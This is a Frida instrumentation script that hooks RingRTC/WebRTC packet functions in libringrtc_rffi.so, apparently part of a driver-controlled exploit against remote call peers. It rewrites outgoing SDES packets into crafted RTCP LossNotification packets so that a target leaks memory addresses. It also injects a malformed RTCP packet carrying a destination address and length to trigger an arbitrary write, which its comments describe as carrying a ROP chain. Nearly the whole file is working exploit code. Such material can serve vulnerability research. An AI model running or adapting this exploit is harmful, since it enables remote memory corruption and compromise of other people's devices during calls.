/* globals
 * debug: bool set by the driver script to enable verbose loggin
 * payload: the payload CopyOnWriteBuffer assembled from driver messages to be
 *  sent to the target
 * toSendLower: lower 32-bits of an address to leak, provided by the driver
 * toSendUpper: upper 32-bits of an address to leak, provided by the driver
 */
var debug = false;
var payload = null;
var toSendLower = null;
var toSendUpper = null;

/*
 * @description: Convert a little endian 32 bit value to big endian and
 * vice versa
 * @input: a 32-bit value
 * @reutrn: a 32-bit value in the opposite endianness
 */
function Le32ToBe32(val) {
    var be = (((val & 0xff) << 24))>>>0
    be += ((((val >> 8) & 0xff)>>>0) << 16)
    be += ((((val >> 16) & 0xff)>>>0) << 8)
    be += ((val >> 24) & 0xff)>>>0;
    return be >>> 0
}

/*
 * @description: find libringrtc_rffi.so module to later fetch symbols.
 */
var ringrtc = 0;
let modules = Process.enumerateModules();
for (var item in modules) {
    let module = modules[item]
    if (module.name == "libringrtc_rffi.so")
        ringrtc = module
}
if (!ringrtc) {
    send({"key": "error", "description": "libringrtc_rffi.so not found"})
}

/*
 * @description: scan symbols from the found module and set globals for useful
 * functions. This requires that RingRTC and WebRTC were compiled with symbols
 * (not stripped)
 */
if (debug) {
    send({"key": "debug", "function": "Scanning symbols from " +
         ringrtc.base.toString(16), "data": ""})}
var functions = {
    "_ZN6webrtc13SrtpTransport14SendRtcpPacketEPN3rtc17CopyOnWriteBufferERKNS1_13PacketOptionsEi": "srtcp_out",
    "_ZN6webrtc12RTCPReceiver14IncomingPacketEN3rtc9ArrayViewIKhLln4711EEE": "rtp_in",
    "_ZN6webrtc12RtpTransport10SendPacketEbPN3rtc17CopyOnWriteBufferERKNS1_13PacketOptionsEi": "rtp_out",
    "_ZN3rtc17CopyOnWriteBufferC1Emm": "CopyOnWriteBuffer_Init",
    "_ZN3rtc17CopyOnWriteBuffer7SetSizeEm": "CopyOnWriteBuffer_SetSize",
    "_ZN3rtc17CopyOnWriteBuffer10AppendDataIhTnPNSt4__Cr9enable_ifIXsr8internal12BufferCompatIhT_EE5valueEvE4typeELPv0EEEvPKS4_m": "CopyOnWriteBuffer_AppendData",
    "_ZNK6webrtc4rtcp4Sdes6CreateEPhPmmN3rtc12FunctionViewIFvNS4_9ArrayViewIKhLln4711EEEEEE": "sdes_create",
}
var symbols = ringrtc.enumerateSymbols();
for (var item in symbols) {
    let name = symbols[item].name
    let variable = functions[name]
    if (!variable) continue

    if (debug) {
        send({"key": "debug",
              "function": "Found " + variable + " at " + symbols[item].address,
              "data": ""})
    }
    global[variable] = symbols[item].address

    delete functions[name]
    if (Object.keys(functions).length == 0)
        break;
}

/*
 * @description: callable function to create a packet using size and capacity
 * rtc::CopyOnWriteBuffer::CopyOnWriteBuffer(unsigned long, unsigned long)
 */
CopyOnWriteBuffer_Init = new NativeFunction(CopyOnWriteBuffer_Init,
                                            'pointer',
                                            ['pointer',
                                                'uint64',
                                                'uint64'
                                            ]);
/*
 * @description: callable function to move the COW buffer "current" pointer
 * rtc::CopyOnWriteBuffer::SetSize(unsigned long)
 */
CopyOnWriteBuffer_SetSize = new NativeFunction(CopyOnWriteBuffer_SetSize,
                                            'pointer',
                                            ['pointer',
                                                'uint64',
                                            ]);


/*
 * @description: callable function to extend a COW buffer
   template <typename T,typename std::enable_if<
        internal::BufferCompat<uint8_t, T>::value>::type* = nullptr>
        void AppendData(const T* data, size_t size)
 */
CopyOnWriteBuffer_AppendData = new NativeFunction(CopyOnWriteBuffer_AppendData,
                                            'pointer',
                                            ['pointer',
                                                'pointer',
                                                'uint64',
                                             ]);

/* global used to focus on a particular returned SSRC, used to match a leak
 * request with a leaked value */
var targetSsrc = null;

/*
 * @description: accepts an input buffer and modifies the packet to create a
 * LossNotificaiton packet (fmt=15, type=206). Note that the buffer provided
 * must be at least 0x14 bytes and its length at the time of sending should
 * be adjusted accordingly
 * @arguments:
 *  mbuf: a ptr to a buffer in memory. Must be at least 0x14 bytes long
 *  sender_ssrc: the 32-bit SSRC to put in the Sender SSRC field. Used as the
 *   upper 32-bits of an arbitrary address. This field should be sent in
 *   big-endian. If null, the existing SSRC is kept in the buffer
 *  media_ssrc: the 32-bit SSRC to put in the Sender SSRC field. Used to leak
 *   the WebRTC RTCPReceiver object (0x4141) as well as
 *   the lower 32-bits of an arbitrary address. This field should be sent in
 *   big-endian. Cannot be null.
 */
function writeLossNotification(mbuf, sender_ssrc, media_ssrc) {
    /* RTCP header */
    var fmt = 15; /* Loss Notification format type */
    /* version + has_padding + count_or_format_ */
    mbuf.add(0x00).writeU8((2<<6) + (0<<5) + (fmt & 0x1f));
    mbuf.add(0x01).writeU8(206);   // kPacketType
    mbuf.add(0x03).writeU8(0x04);  // length BigEndian ((0xc payload + 0x4 header) // 4)

    /* if requesting an arbirary address, set the Sender SSRC value */
    if (sender_ssrc != null) {
        var be = Le32ToBe32(sender_ssrc);
        mbuf.add(0x04).writeU32(be);
    }
    /* Set the Media SSRC. Cannot be null */
    if (media_ssrc == null) {
        send({"key": "error",
              "str": "media_ssrc in writeLossNotification cannot be null"});
    }
    var be = Le32ToBe32(media_ssrc);
    mbuf.add(0x08).writeU32(be);

    /*
     * set the target SSRC for the returned packet. This is matched during
     * parsing so that the leak can be successfully communicated back to the
     * driver
     */
    targetSsrc = be;

    /*
     * unique identifier must match the expected value otherwise the packet
     * will be discarded
     */
    mbuf.add(0x0c).writeU32(0x46544E4C);

    /*
     * indicate an address is embedded in the SSRCs for an arb read request.
     */
    mbuf.add(0x10).writeU16(0x3713);

    /*
     * write a hardcoded value for last_received_delta_and_decoded - not used
     * in the leak primitive
     */
    mbuf.add(0x12).writeU16(0x4444);

    if (debug) {
        send({"key": "debug", "function": "Assembled Loss Notification packet",
              "data": hexdump(mbuf, { length: 0x14 })});
    }
}

/*
 * @description: assembles manufactured payload to trigger the arb write.
 * @arguments:
 *  pload: ArrayBuffer payload which is the `src` data to be copied
 *  address: Int in little-endian indicating the `dst` for the copy
 *  len: Int in little-endian representing the length of the copy
 */
function writePayload(pload, address, len) {
    /* payload already created, no need to proceed */
    if (payload != null) {
        send({"key": "error", "str": "Payload already set"});
        return;
    }

    var bytes  = new Uint8Array(pload);
    var size = bytes.length;
    /*
     * packet length in header is length of packet (incl. header) in dwords
     * header is 4 dwords (version + fmt as u8, type as u8, cnt as u16)
     * add additional u32 for size prepended to payload
     */
    var count = Math.floor(size/4) + 4 - 1 + 1;
    var mbuf = Memory.alloc(256+size);

    /* RTCP header */
	/* version + has_padding + count_or_format_ */
    mbuf.add(0).writeU8((2<<6) + (0<<5) + (1 & 0x1f));
    /* packet_type_ */
    mbuf.add(1).writeU8(222);

    /* length in big endian */
    mbuf.add(3).writeU8(count);
    mbuf.add(4).writeU64(address);
    mbuf.add(0xc).writeU32(len);
    for (let i = 0; i < size; i++) {
        mbuf.add(0x10+i).writeU8(bytes[i]);
    }

    /* allocate memory for custom COW buffer */
    var cow = Memory.alloc(0x1000);
    /* initialize buffer with size of payload and large max size */
    CopyOnWriteBuffer_Init(cow, 4+4*count, 3000);
    /* reset pointer in buffer to 0 prior to appending data */
    CopyOnWriteBuffer_SetSize(cow, 0);
    /* append buffer to data (will copy into start of backing buffer and set size) */
    CopyOnWriteBuffer_AppendData(cow, mbuf, 4+4*count);
    if (debug) {
        send({"key": "debug", "function": "COW",
              "data": hexdump(ptr(cow),
              { length: 0x20 })})
        send({"key": "debug", "function": "Assembled payload:",
              "data": hexdump(ptr(cow).readPointer().add(0x10).readPointer(),
              { length: 4+4*count })})
    }
    payload = cow;
}

/*
 * @description: receive configuration options. Should occur before any execution
 * @arguments:
 *   onMessage: handler for a message from the Python driver with a "debug" key
 */
recv("config", function onMessage(driverMessage) {
    if (driverMessage.hasOwnProperty("debug")) { debug = driverMessage.debug }
});

/*
 * @description: receive configuration options. Should occur before any execution
 * @arguments:
 *   onMessage: handler for a message from the Python driver with an "exit" key
 */
recv("exit", function onMessage(driverMessage) {
    throw 'Exiting Frida JS script';
});

/*
 * @description: receive a command from the driver. If the "command" is "read"
 *   then the message contains an address to leak with the upper and lower
 *   32 bits separated. If the "command" is "write" then it will assemble and
 *   throw a blank payload, overwriting data at the address specified
 * @arguments:
 *   driverMessage: message from the Python driver with a command an associated
 *   data.
 */
function onCommand(driverMessage) {
    try {
        if (driverMessage.hasOwnProperty("command") &&
            driverMessage.command == "write") {
            var dst = new UInt64(driverMessage.addr);
            var len = new UInt64(driverMessage.len);
		    writePayload(new Uint8Array(), dst, len);
            return;
        }
        if (driverMessage.hasOwnProperty("toSendLower")) {
            toSendLower = driverMessage.toSendLower;
        }
        if (driverMessage.hasOwnProperty("toSendUpper")) {
            toSendUpper = driverMessage.toSendUpper
        }
    } catch (error) {
        console.log("Error in onLeakMessage")
        console.log(error)
    }
}

/*
 * @description: get a leaked address from a returned SDES packet. The leak
 *  should be in the CNAME field (6 bytes into the packet) and should be in hex
 *  ASCII text
 * @arguments:
 *   packet: a pointer to a packet of length `length`
 *   length: the length of the `packet`
 * @reutrn: an UInt64 with the leaked address or `null` if the parsing failed
 */
function getLeakedAddress(packet, length) {
    var addr = ""
    var idx = 6
    while (true) {
        let char = packet.add(idx++).readU8();
        if (char == 0) { break; }
        addr += String.fromCharCode(char);
    }
    try {
        var leak = new UInt64(addr);
        return leak;
    } catch (error) {
        console.log("Error getting leak");
        return null;
    }
}

/*
 * @description: parses an SDES message received from the target. Checks if the
 *  media SSRC matches a previously requested value. If so, it communicates the
 *  leaked address back to the driver.
 * @arguments:
 *   packet: a pointer to a packet of length `length`
 *   length: the length of the `packet`
 */
function parseSDES(packet, length) {
    var ssrc = packet.readU32();

    if (debug) {
        send({"key": "debug", "function": "RTCPReceiver::IncomingPacket",
              "data": "Received SDES packet with Sender SSRC: " +
              ssrc.toString(16) + "\n" + hexdump(packet, { length: length })});
    }

    /* If the target SSRC does not match the one received, then bail */
    if (ssrc != targetSsrc) { return }

    /*
     * if the target SSRC matches, parse the packet for a leak and communicate
     * the target SSRC and leaked value back to the driver. Reset globals and
     * await the next request
     */
    var leak = getLeakedAddress(packet, length);
    if (leak) {
        send({"key": "LeakedAddr", "val": leak, "lower32": Le32ToBe32(ssrc)});
        targetSsrc = null;
        toSendLower = null;
        toSendUpper = null;
    }
}

/*
 * @description: attaches to the
 *   `webrtc::RTCPReceiver::IncomingPacket(
 *      rtc::ArrayView<unsigned char const, -4711l>)` function to hook incoming
 *   packet handling. Checks the packet type to see if it is an SDES (type=202).
 *   If so, it sends to `parseSDES` for handling
 */
Interceptor.attach(rtp_in, {
    onEnter : function(args) {
        var packet = ptr(args[1])
        var packet_type = packet.add(ptr(1)).readU8()
        var isRtcp = (64 <= (packet_type & 0x7f) && (packet_type & 0x7f) < 96)
        let length = packet.add(ptr(2)).readU8()*0x100 + packet.add(ptr(3)).readU8() + 1

        if (!isRtcp && debug) {
            send({"key": "debug", "function": "RTP packet received with type:",
                  "data": packet_type.toString(16)});
        }
        if (isRtcp) {
            /* check if SDES (type=202) and parse if so */
            if (packet_type == 202) {
                try {
                    parseSDES(packet.add(ptr(4)), length*4-4)
                } catch (error) {
                    console.log("Error in rtp_in")
                    console.log(error)
                }
            }
        }
    }
});

/*
 * @description: attaches to the
 *   `webrtc::rtcp::Sdes::Create(unsigned char*,
 *                               unsigned long*,
 *                               unsigned long,
 *                               rtc::FunctionView<void (rtc::ArrayView<unsigned char const, -4711l>)>) const`
 *   function. Clobbers the outgoing packet data after assembly if a requested
 *   adddress was provided by the driver
 */
Interceptor.attach(sdes_create, {
    onEnter : function(args) {
        try {
            this.sdes_packet = args[1];
            this.sdes_length = args[2];
        } catch (error) {
            console.log("Error in Sdes_create");
            console.log(error);
        }
    },
    onLeave : function(retval) {
        try {
            /*
             * request an address to leak from the driver,
             * clobber the packet and insert the
             * requested address using `writeLossNotification`
             */
            send({"key": "CommandRequest"})
            recv('command', onCommand).wait();
            if (toSendLower) {
                writeLossNotification(this.sdes_packet, toSendUpper, toSendLower)
                /*
                 * update the packet length to 0x14 bytes, the length of a
                 * LossNotification packet
                 */
                this.sdes_length.writeU32(0x14);
            }

            /* log the outgoing packet if debug mode is on */
            if (debug) {
                let l = this.sdes_length.readU32();
                send({"key":"debug", "function": "Sdes::Create",
                     "data": hexdump(this.sdes_packet, { length: l })});
            }
        } catch (error) {
            console.log("Error in Sdes_create onLeave");
            console.log(error);
        }
    }
});

/*
 * @description: attaches to the
 * webrtc::SrtpTransport::SendRtcpPacket(rtc::CopyOnWriteBuffer*,
                                         rtc::PacketOptions const&, int)
 *   function. Replaces the outgoing packet with a new COW buffer including
 *   the ROP chain payload if the payload has been received
 */
Interceptor.attach(srtcp_out, {
    onEnter : function(args) {
        try {
            if (payload != null) {
                if (debug) {
                    send({"key": "debug", "function": "SrtpTransport::SendRtcpPacket",
                          "data": "Sending Payload!"});
                }
                args[1] = payload;
            }
            if (debug) {
                send({"key": "debug", "function": "SrtpTransport::SendRtcpPacket",
                      "data": hexdump(args[1].readPointer().add(0x10).readPointer(),
                      { length: 0x20 })});
            }
        } catch (error) {
            console.log(error)
        }
    }
});